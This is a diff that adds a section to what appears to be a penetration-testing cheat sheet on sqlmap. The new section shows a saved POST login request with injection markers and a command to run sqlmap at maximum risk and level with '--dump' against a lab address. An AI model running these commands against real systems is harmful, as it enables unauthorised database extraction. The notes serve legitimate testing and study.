@@ -26,6 +26,22 @@ sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --risk=3 --leve
 
 <br />
 
+## POST request (specify the request file)
+
+```sh
+# request.txt
+POST /login HTTP/1.1
+Host: 10.0.0.1
+
+{"username":"*", "password": "*"}
+
+# --------------------------------------------------------
+
+sqlmap -r request.txt --risk=3 --level=5 --dump
+```
+
+<br />
+
 ## GET request
 
 ```sh
